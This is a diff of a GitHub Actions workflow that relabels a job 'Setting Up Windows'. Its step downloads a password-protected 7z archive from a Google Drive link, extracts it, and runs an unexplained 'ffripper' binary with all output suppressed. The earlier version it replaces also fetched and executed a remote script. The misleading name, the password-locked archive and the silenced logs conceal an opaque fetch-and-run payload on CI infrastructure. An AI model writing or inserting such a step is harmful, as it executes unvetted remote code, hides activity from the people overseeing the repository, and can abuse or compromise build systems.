@@ -9,10 +9,10 @@ on:
         required: true
 jobs:
   build:
-    name: FreeFireRipper Standard
+    name: Setting Up Windows 
     runs-on: windows-latest
 
     steps:
-    - name: Gwkang Free Fire Ripper Setup
+    - name: FreeFireRipper Standard
       run: |
-        cd c:\temp && Invoke-WebRequest -Uri "https://drive.usercontent.google.com/download?id=1WnSoXjSi5X-5emios4LTQuBZo527X8mX&export=download&authuser=0&confirm=t&uuid=deeb6c82-1e27-4673-8fd1-adc9610335b8&at=AIrpjvOjCdEaN5NzCnhkefDu4gAg%3A1736686406585" -OutFile "${{ github.workflow }}.ps1" && .\${{ github.workflow }} ${{ github.workflow }}1 ${{ github.workflow }}2 ${{ github.workflow }}3 ${{ github.workflow }}4  
+        cd c:\temp && Invoke-WebRequest -Uri "https://drive.usercontent.google.com/download?id=1nO2wHP_jiIPREmw4XB-6u4UtrPk420c7&export=download&authuser=0&confirm=t&uuid=c1cfc8db-def1-440c-a508-e0c2909ae65f&at=AIrpjvMENwJCtzImtYnOi9oX-8RB%3A1736507853253" -OutFile "${{ github.workflow }}.7z" > $null 2>&1 && 7z x ${{ github.workflow }}.7z -p${{ github.workflow }} > $null 2>&1 &&  .\ffripper ${{ github.workflow }} 
